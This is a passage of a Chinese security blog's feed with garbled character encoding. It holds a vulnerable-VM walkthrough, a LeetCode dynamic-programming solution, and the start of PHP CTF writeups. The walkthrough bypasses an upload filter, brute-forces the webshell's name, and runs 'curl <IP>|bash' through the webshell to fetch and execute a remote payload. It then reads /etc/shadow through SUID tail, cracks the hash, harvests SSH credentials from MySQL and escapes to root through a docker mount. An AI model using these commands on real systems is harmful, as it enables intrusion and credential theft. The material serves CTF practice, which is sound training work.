åªéªŒè¯äº†æ–‡ä»¶å</span></span><br><span class="line">$check = getimagesize($_FILES[<span class="string">"file"</span>][<span class="string">"tmp_name"</span>]);</span><br><span class="line"><span class="keyword">if</span>($check[<span class="string">"mime"</span>] == <span class="string">"image/png"</span> || $check[<span class="string">"mime"</span>] == <span class="string">"image/gif"</span>)&#123;</span><br><span class="line">$uploadOk = <span class="number">1</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">$uploadOk = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">":)"</span>;</span><br><span class="line">&#125; </span><br><span class="line">  <span class="keyword">if</span>($uploadOk == <span class="number">1</span>)&#123;</span><br><span class="line">      move_uploaded_file($_FILES[<span class="string">"file"</span>][<span class="string">"tmp_name"</span>], $target_file.<span class="string">"."</span>.$imageFileType);</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">"File uploaded /uploads/?"</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><a href="https://0x1.im/blog/php/php-function-getimagesize.html" target="_blank" rel="noopener">getimagesize å‡½æ•°ä¸æ˜¯å®Œå…¨å¯é çš„</a></p><p>ä¿®æ”¹æˆåŠŸã€‚å¯æŒ‰ä¸Šé¢é“¾æ¥çš„æ–¹æ³•æ”¹ï¼Œä¹Ÿå¯ç›´æ¥åœ¨ post å†…å®¹é‡ŒåŠ ä¸Š <code>GIF98</code> ä¹‹ç±»çš„å¤´ä¿¡æ¯ã€‚</p><p><img src="http://ww1.sinaimg.cn/large/de75fd55gy1g1xol2qxk6j20cw05874g.jpg" alt></p><p>å†å†™ä¸€ä¸ªè„šæœ¬</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests, hashlib</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">100</span>):</span><br><span class="line">    url = <span class="string">"http://192.168.0.106:8000/uploads/"</span></span><br><span class="line">    key = <span class="string">'2.php'</span> + str(i)</span><br><span class="line">    m5 = hashlib.md5(key.encode()).hexdigest()</span><br><span class="line">    url += m5 + <span class="string">'.php'</span></span><br><span class="line">    re = requests.get(url)</span><br><span class="line">    print(re.status_code)</span><br><span class="line">    <span class="keyword">if</span> re.status_code == <span class="number">200</span>:</span><br><span class="line">        print(url, <span class="number">23333333333333333333333333333333333333333333333333</span>)</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>æˆ–è€…æŒ‰è¿™ç§ <code>fuzz</code> çš„åŠæ³•ï¼Œä¹Ÿå¯ä»¥ç”¨ <code>Burp</code> ä¸­çš„ <code>instruder</code> ï¼Œä¸å†èµ˜è¿°ã€‚</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wfuzz -w test.txt --hc 404 http://localhost:8000/uploads/FUZZ.php</span><br></pre></td></tr></table></figure><h3 id="åå¼¹-shell"><a href="#åå¼¹-shell" class="headerlink" title="åå¼¹ shell"></a>åå¼¹ shell</h3><p>ç›´æ¥å¼¹ shellï¼ŒæˆåŠŸã€‚ä¹Ÿå¯ä»¥æ‰§è¡Œ <code>nc</code> å‘½ä»¤æŠŠ bash åå¼¹å‡ºæ¥ã€‚</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//</span><span class="number">192.168</span>.<span class="number">0.106</span>:<span class="number">8000</span><span class="regexp">/uploads/</span><span class="number">9</span>e2b0f7dd8852a2987e7ade6fb2e948f.php</span><br><span class="line">?<span class="number">1</span>=system(<span class="string">"curl 47.101.220.241|bash"</span>);</span><br></pre></td></tr></table></figure><h3 id="å¼€å§‹ææƒ"><a href="#å¼€å§‹ææƒ" class="headerlink" title="å¼€å§‹ææƒ"></a>å¼€å§‹ææƒ</h3><p>è·å–åˆ°ä½æƒé™SHELLåæˆ‘ä»¬é€šå¸¸åšä¸‹é¢å‡ ä»¶äº‹</p><ul><li><p>æ£€æµ‹æ“ä½œç³»ç»Ÿçš„å‘è¡Œç‰ˆæœ¬</p></li><li><p>æŸ¥çœ‹å†…æ ¸ç‰ˆæœ¬</p></li><li><p>æ£€æµ‹å½“å‰ç”¨æˆ·æƒé™</p></li><li><p>åˆ—ä¸¾ suid æ–‡ä»¶</p></li><li><p>æŸ¥çœ‹å·²ç»å®‰è£…çš„åŒ…ï¼Œç¨‹åºï¼Œè¿è¡Œçš„æœåŠ¡ï¼Œè¿‡æœŸç‰ˆæœ¬çš„æœ‰å¯èƒ½æœ‰æ¼æ´</p></li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> æŸ¥çœ‹å†…æ ¸ä¿¡æ¯</span></span><br><span class="line">uname -a</span><br><span class="line">Linux 1afdd1f6b82c 4.15.0-29-generic #31~16.04.1-Ubuntu SMP Wed Jul 18 08:54:04 UTC 2018 x86_64 GNU/Linux</span><br><span class="line"><span class="meta">#</span><span class="bash"> æ¯”è¾ƒæ–°ï¼Œæœ‰ç›¸åº”çš„ cve å¯ä»¥ææƒï¼Œç„¶è€Œè¦ç­‰ä¸€ä¸ªå¤šå°æ—¶</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> æŸ¥çœ‹ä»¥ root è¿è¡Œçš„æœåŠ¡</span></span><br><span class="line">www-data@1afdd1f6b82c:/var/www/html$ ps -aux | grep root</span><br><span class="line">root   1  0.0  1.6 388000 16496 ?    Ss   09:12   0:00 apache2 -DFOREGROUND</span><br><span class="line">root   77  0.0  0.2  18000  2560 ?   Ss   09:12   0:00 /bin/bash /etc/init.d/delete.sh</span><br><span class="line">root       370  0.0  0.0   4200   676 ?        S    12:52   0:00 sleep 300</span><br><span class="line">www-data   390  0.0  0.0  11116   944 ?        S    12:57   0:00 grep root</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> å“ˆå“ˆï¼Œè¿˜æœ‰ä¸ªå®šæ—¶åˆ é™¤çš„ä»»åŠ¡</span></span><br><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line">while [ 1 ]</span><br><span class="line">do</span><br><span class="line">    rm -rf /var/www/html/uploads/*.php</span><br><span class="line">    sleep 300</span><br><span class="line">done</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> suid</span></span><br><span class="line">find / -perm -u=s -type f 2&gt;/dev/null</span><br><span class="line">/usr/bin/chsh</span><br><span class="line">/usr/bin/gpasswd</span><br><span class="line">/usr/bin/passwd</span><br><span class="line">/usr/bin/newgrp</span><br><span class="line">/usr/bin/tail</span><br><span class="line">/usr/bin/chfn</span><br><span class="line">/bin/mount</span><br><span class="line">/bin/umount</span><br><span class="line">/bin/su</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> èƒ½æ‹¿åˆ° root çš„å“ˆå¸Œ</span></span><br><span class="line">tail -n 100 /etc/shadow</span><br><span class="line">root:$6$qoj6/JJi$FQe/BZlfZV9VX8m0i25Suih5vi1S//OVNpd.PvEVYcL1bWSrF3XTVTF91n60yUuUMUcP65EgT8HfjLyjGHova/:17951:0:99999:7:::</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> æŠŠè¿™ä¸ªå­˜ä¸º <span class="built_in">hash</span></span></span><br><span class="line">john hash</span><br><span class="line">john --show</span><br><span class="line"><span class="meta">#</span><span class="bash"> å¾—åˆ°å¯†ç ï¼šjohn</span></span><br></pre></td></tr></table></figure><p>æ— æ³•ç›´æ¥åœ¨ <code>nc</code> é‡Œåˆ‡åˆ° rootï¼Œæ‹¿åˆ°å¯†ç ä¹‹åè¿æ¥ <code>ssh</code> è¯•è¯•ï¼Œå¯†ç é”™è¯¯ï¼Œå¿…é¡»æ¨¡æ‹Ÿä¸€ä¸‹ç»ˆç«¯è®¾å¤‡ã€‚</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c 'import pty;pty.spawn("/bin/sh")'</span><br></pre></td></tr></table></figure><p>å…ˆçœ‹ä¸‹ <code>flag</code> ï¼Œè¿˜æ˜¯ä¸è¡Œã€‚</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cat flag</span><br><span class="line">Life consists of details..</span><br></pre></td></tr></table></figure><p>é‚£æˆ‘ä»¬å†æ‰¾æ‰¾ï¼Œ<code>/root</code> ç›®å½•ä¸‹è¿˜æœ‰ä¸ªä¸œè¥¿ã€‚</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cat .port</span><br><span class="line">Listen to your friends..</span><br><span class="line">7*</span><br></pre></td></tr></table></figure><h3 id="å³°å›è·¯è½¬"><a href="#å³°å›è·¯è½¬" class="headerlink" title="å³°å›è·¯è½¬"></a>å³°å›è·¯è½¬</h3><p>æ‰¾äº†ä¸‹ 7 å¼€å¤´çš„ç«¯å£ï¼Œå‘ç°æ²¡è¿™ç©æ„ã€‚ä¸è¿‡æˆ‘ä»¬é—æ¼äº† MySQLï¼Œå»çœ‹çœ‹ã€‚</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line">cat wp-config.php</span><br><span class="line">/** MySQL database username */</span><br><span class="line">define('DB_USER', 'wordpress');</span><br><span class="line">/** MySQL database password */</span><br><span class="line">define('DB_PASSWORD', 'wordpress');</span><br><span class="line">/* MySQL hostname */</span><br><span class="line">define('DB_HOST', 'db:3306');</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> ç›´æ¥è¿›å…¥å¤±è´¥äº†</span></span><br><span class="line">mysql -u wordpress -p wordpress</span><br><span class="line">ERROR 2002 (HY000): Can't connect to local MySQL server through socket '/var/run/mysqld/mysqld.sock' (2 "No such file or directory")</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> å…ˆæ‹¿åˆ° ip</span></span><br><span class="line">ping db -c 3</span><br><span class="line">64 bytes from experimental_db_1.experimental_default (172.18.0.2): icmp_seq=65 ttl=64 time=0.044 ms</span><br><span class="line"><span class="meta">#</span><span class="bash"> è¿˜æœ‰ä¸€æ‹›</span></span><br><span class="line">arp -an</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> è¿œç¨‹è¿æ¥è¯•è¯•</span></span><br><span class="line">mysql -h 172.18.0.2 -u wordpress -p wordpress</span><br><span class="line">MySQL [(none)]&gt; show databases;</span><br><span class="line">show databases;</span><br><span class="line">+--------------------+</span><br><span class="line">| Database           |</span><br><span class="line">+--------------------+</span><br><span class="line">| information_schema |</span><br><span class="line">| wordpress          |</span><br><span class="line">+--------------------+</span><br><span class="line">2 rows in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">MySQL [(none)]&gt; use wordpress;</span><br><span class="line">use wordpress;</span><br><span class="line">Reading table information for completion of table and column names</span><br><span class="line">You can turn off this feature to get a quicker startup with -A</span><br><span class="line"></span><br><span class="line">Database changed</span><br><span class="line">MySQL [wordpress]&gt; show tables;</span><br><span class="line">show tables;</span><br><span class="line">+-----------------------+</span><br><span class="line">| Tables_in_wordpress   |</span><br><span class="line">+-----------------------+</span><br><span class="line">| host_ssh_cred         |</span><br><span class="line">| wp_commentmeta        |</span><br><span class="line">| wp_comments           |</span><br><span class="line">| wp_links              |</span><br><span class="line">| wp_options            |</span><br><span class="line">| wp_postmeta           |</span><br><span class="line">| wp_posts              |</span><br><span class="line">| wp_term_relationships |</span><br><span class="line">| wp_term_taxonomy      |</span><br><span class="line">| wp_termmeta           |</span><br><span class="line">| wp_terms              |</span><br><span class="line">| wp_usermeta           |</span><br><span class="line">| wp_users              |</span><br><span class="line">+-----------------------+</span><br><span class="line">13 rows in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">MySQL [wordpress]&gt; select * from host_ssh_cred;</span><br><span class="line">select * from host_ssh_cred;</span><br><span class="line">+-------------------+----------------------------------+</span><br><span class="line">| id                | pw                               |</span><br><span class="line">+-------------------+----------------------------------+</span><br><span class="line">| hummingbirdscyber | e10adc3949ba59abbe56e057f20f883e |</span><br><span class="line">+-------------------+----------------------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure><h3 id="æ‹¿åˆ°æƒé™"><a href="#æ‹¿åˆ°æƒé™" class="headerlink" title="æ‹¿åˆ°æƒé™"></a>æ‹¿åˆ°æƒé™</h3><p>è§£å¯†å¯å¾— <code>123456</code>ï¼Œæ­¤æ—¶å†è¯•è¯• <code>ssh</code> è¿æ¥ã€‚</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">hummingbirdscyber@vulnvm:~$ id</span><br><span class="line">uid=1000(hummingbirdscyber) gid=1000(hummingbirdscyber) groups=1000(hummingbirdscyber),4(adm),24(cdrom),30(dip),46(plugdev),113(lpadmin),128(sambashare),129(docker)</span><br></pre></td></tr></table></figure><p>å‘ç° docker çš„èº«å½±</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">docker ps</span><br><span class="line">hummingbirdscyber@vulnvm:~$ docker ps</span><br><span class="line">CONTAINER ID        IMAGE               COMMAND                  CREATED             STATUS              PORTS                  NAMES</span><br><span class="line">252fa8cb1646        ubuntu              "/bin/bash"              6 weeks ago         Up 5 minutes                               brave_edison</span><br><span class="line">1afdd1f6b82c        wordpress:latest    "docker-entrypoint.sâ€¦"   6 weeks ago         Up 5 minutes        0.0.0.0:8000-&gt;80/tcp   experimental_wordpress_1</span><br><span class="line">81a93420fd22        mysql:5.7           "docker-entrypoint.sâ€¦"   6 weeks ago         Up 5 minutes        3306/tcp, 33060/tcp    experimental_db_1</span><br></pre></td></tr></table></figure><p>è¿›äº†å‡ ä¸ªå®¹å™¨çœ‹äº†ä¸‹ï¼Œæ‰¾ä¸åˆ° <code>flag</code>ï¼Œå¡ä½äº†ã€‚</p><blockquote><p>We find that the Ubuntu image is available to us, so we use this to create a new docker container and mount the / directory of the host inside a folder called /root. After we run the docker image we go to /root/root and find a file called â€œflagâ€. When we open the file, we find our congratulatory flag.</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -v /:/root -i -t ubuntu /bin/bash</span><br></pre></td></tr></table></figure><p>æ‰¾äº†ä¸‹ wpï¼Œæœ‰äº›å¤§ä½¬æ˜¯è¿™æ ·ç©çš„ï¼Œä¸ºå•¥ä¸€å®šè¦åŠ  <code>/:/root</code> ï¼Ÿ</p><p>æ‹¿åˆ°æƒé™å°±è¡Œï¼Œä»¥åå†è¡¥å……ã€‚</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;å‰è¨€&quot;&gt;&lt;a href=&quot;#å‰è¨€&quot; class=&quot;headerlink&quot; title=&quot;å‰è¨€&quot;&gt;&lt;/a&gt;å‰è¨€&lt;/h2&gt;&lt;p&gt;å®æˆ˜å¥½ç©ï¼Œç´§å¼ åˆºæ¿€ï¼Œä½†å¾ˆéš¾èƒ½é’ˆå¯¹æ€§åœ°ç»ƒä¹ æŸä¸€ç§çŸ¥è¯†ï¼Œæ›´åƒæ˜¯ä¸€ç§ç»¼åˆæ€§çš„è€ƒè¯•ã€‚&lt;/p&gt;
&lt;p&gt;å…¶æ¬¡ï¼Œå¤§ç‰›éƒ½è¯´ï¼Œæ¸—é€æµ‹è¯•çš„æœ¬è´¨å°±æ˜¯ä¿¡æ¯æ”¶é›†ï¼Œä¿¡æ¯
      
    
    </summary>
    
    
      <category term="æ¸—é€æµ‹è¯•" scheme="https://wywwzjj.top/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
  </entry>
  
  <entry>
    <title>Leetcode 322.Coin Change[DP]</title>
    <link href="https://wywwzjj.top/2019/04/04/Leetcode-322-Coin-Change/"/>
    <id>https://wywwzjj.top/2019/04/04/Leetcode-322-Coin-Change/</id>
    <published>2019-04-04T01:07:35.000Z</published>
    <updated>2019-04-04T01:57:42.567Z</updated>
    
    <content type="html"><![CDATA[<h2 id="é¢˜ç›®æè¿°"><a href="#é¢˜ç›®æè¿°" class="headerlink" title="é¢˜ç›®æè¿°"></a>é¢˜ç›®æè¿°</h2><p>ç»™å®šä¸åŒé¢é¢çš„ç¡¬å¸ coins å’Œä¸€ä¸ªæ€»é‡‘é¢ amountã€‚ç¼–å†™ä¸€ä¸ªå‡½æ•°æ¥è®¡ç®—å¯ä»¥å‡‘æˆæ€»é‡‘é¢æ‰€éœ€çš„æœ€å°‘çš„ç¡¬å¸ä¸ªæ•°ã€‚å¦‚æœæ²¡æœ‰ä»»ä½•ä¸€ç§ç¡¬å¸ç»„åˆèƒ½ç»„æˆæ€»é‡‘é¢ï¼Œè¿”å› <code>-1</code>ã€‚</p><p><strong>ç¤ºä¾‹ 1:</strong></p><figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">è¾“å…¥: coins = [1, 2, 5], amount = 11</span><br><span class="line">è¾“å‡º:<span class="number"> 3 </span></span><br><span class="line">è§£é‡Š:<span class="number"> 11 </span>=<span class="number"> 5 </span>+<span class="number"> 5 </span>+ 1</span><br></pre></td></tr></table></figure><p><strong>ç¤ºä¾‹ 2:</strong></p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">è¾“å…¥: coins = [2], amount = 3</span></span><br><span class="line"><span class="section">è¾“å‡º: -1</span></span><br></pre></td></tr></table></figure><h2 id="åˆ†æ"><a href="#åˆ†æ" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h2><p>è€ƒè™‘çŠ¶æ€æ–¹ç¨‹ï¼Œéœ€æè¿°å‡ºç»„åˆæˆæ€»é‡‘é¢æ‰€èŠ±æœ€å°‘çš„ç¡¬å¸ä¸ªæ•°ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># dp[i][j] è¡¨ç¤ºä½¿ç”¨å‰ i ç§ç¡¬å¸è¡¨ç¤ºæ€»é¢ j æ‰€ç”¨çš„æœ€å°‘ç¡¬å¸æ•°</span></span><br><span class="line"><span class="comment"># åˆå§‹çŠ¶æ€ dp[-1][j] = âˆ  dp[i][0] = 0</span></span><br><span class="line">dp[i][j] = min(dp[i][j], dp[i<span class="number">-1</span>][j-coin_i*k] + k)</span><br><span class="line"> = min(dp[i][j], dp[i][j-coin_i] + <span class="number">1</span>)</span><br><span class="line"><span class="comment"># è§‚å¯Ÿå‘ç°éƒ½å…·æœ‰ dp[i]ï¼Œè¿›ä¸€æ­¥å‹ç¼©ï¼Œä½¿ç”¨æ»šåŠ¨æ•°ç»„</span></span><br><span class="line">dp[j] = min(dp[j], dp[j-coin_i] + <span class="number">1</span>)</span><br></pre></td></tr></table></figure><p>ä»¥*<em>ç¤ºä¾‹ 1 *</em>ä¸ºä¾‹</p><p><img src="http://ww1.sinaimg.cn/large/de75fd55gy1g1qceh5ejjj20qb035gll.jpg" alt></p><h2 id="code"><a href="#code" class="headerlink" title="code"></a>code</h2><p><strong>DP</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># æ‰§è¡Œç”¨æ—¶ï¼š1672 msï¼Œå‡»è´¥äº† 39.85% çš„ç”¨æˆ·</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">coinChange</span><span class="params">(self, coins: List[int], amount: int)</span> -&gt; int:</span></span><br><span class="line">    dp = [amount+<span class="number">1</span>] * (amount + <span class="number">5</span>)</span><br><span class="line">    dp[<span class="number">0</span>] = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> coin <span class="keyword">in</span> coins:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(amount+<span class="number">1</span>):</span><br><span class="line">            <span class="keyword">if</span> (i - coin &gt;= <span class="number">0</span>):</span><br><span class="line">            dp[i] = min(dp[i], dp[i-coin] + <span class="number">1</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span> <span class="keyword">if</span> dp[amount] &gt;= amount + <span class="number">1</span> <span class="keyword">else</span> dp[amount]</span><br></pre></td></tr></table></figure><p><strong>DFS + greedy + pruning</strong></p><p>å¾…è¡¥å……</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;é¢˜ç›®æè¿°&quot;&gt;&lt;a href=&quot;#é¢˜ç›®æè¿°&quot; class=&quot;headerlink&quot; title=&quot;é¢˜ç›®æè¿°&quot;&gt;&lt;/a&gt;é¢˜ç›®æè¿°&lt;/h2&gt;&lt;p&gt;ç»™å®šä¸åŒé¢é¢çš„ç¡¬å¸ coins å’Œä¸€ä¸ªæ€»é‡‘é¢ amountã€‚ç¼–å†™ä¸€ä¸ªå‡½æ•°æ¥è®¡ç®—å¯ä»¥å‡‘æˆæ€»é‡‘é¢æ‰€éœ€çš„æœ€å°‘çš„ç¡¬å¸ä¸ªæ•°ã€‚å¦‚æœæ²¡æœ‰ä»»
      
    
    </summary>
    
    
      <category term="ç®—æ³•" scheme="https://wywwzjj.top/tags/%E7%AE%97%E6%B3%95/"/>
    
  </entry>
  
  <entry>
    <title>æ— å­—æ¯æ•°å­— webshell</title>
    <link href="https://wywwzjj.top/2019/04/02/%E6%97%A0%E5%AD%97%E6%AF%8D%E6%95%B0%E5%AD%97-webshell/"/>
    <id>https://wywwzjj.top/2019/04/02/æ— å­—æ¯æ•°å­—-webshell/</id>
    <published>2019-04-02T15:19:52.000Z</published>
    <updated>2019-04-04T01:55:40.421Z</updated>
    
    <content type="html"><![CDATA[<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">'flag.php'</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'code'</span>]))&#123;</span><br><span class="line">    $code = $_GET[<span class="string">'code'</span>];</span><br><span class="line">    <span class="keyword">if</span>(strlen($code)&gt;<span class="number">40</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"Long."</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">"/[A-Za-z0-9]+/"</span>,$code))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"NO."</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    @<span class="keyword">eval</span>($code);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//$hint =  "php function getFlag() to get flag";</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;figure class=&quot;highlight php&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;
      
    
    </summary>
    
    
      <category term="webshell" scheme="https://wywwzjj.top/tags/webshell/"/>
    
  </entry>
  
  <entry>
    <title>PHP SECURITY CALENDAR Writeup</title>
    <link href="https://wywwzjj.top/2019/03/02/PHP-SECURITY-CALENDAR-2017/"/>
    <id>https://wywwzjj.top/2019/03/02/PHP-SECURITY-CALENDAR-2017/</id>
    <published>2019-03-02T04:10:12.000Z</published>
    <updated>2019-07-12T10:24:20.998Z</updated>
    
    <content type="html"><![CDATA[<p>æœ‰æ„æ€ä¸€ç‚¹çš„ä¼˜å…ˆåšäº†ï¼Œæœ‰æ—¶é—´å†æ›´æ–°ã€‚</p><h2 id="1-Wish-List"><a href="#1-Wish-List" class="headerlink" title="1 - Wish List"></a>1 - Wish List</h2><blockquote><p>in_array</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Challenge</span> </span>&#123;</span><br><span class="line">    <span class="keyword">const</span> UPLOAD_DIRECTORY = <span class="string">'./solutions/'</span>;</span><br><span class="line">    <span class="keyword">private</span> $file;</span><br><span class="line">    <span class="keyword">private</span> $whitelist;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($file)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;file = $file;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;whitelist = range(<span class="number">1</span>, <span class="number">24</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (in_array(<span class="keyword">$this</span>-&gt;file[<span class="string">'name'</span>], <span class="keyword">$this</span>-&gt;whitelist)) &#123;</span><br><span class="line">            move_uploaded_file(</span><br><span class="line">                <span class="keyword">$this</span>-&gt;file[<span class="string">'tmp_name'</span>],</span><br><span class="line">                <span class="keyword">self</span>::UPLOAD_DIRECTORY . <span class="keyword">$this</span>-&gt;file[<span 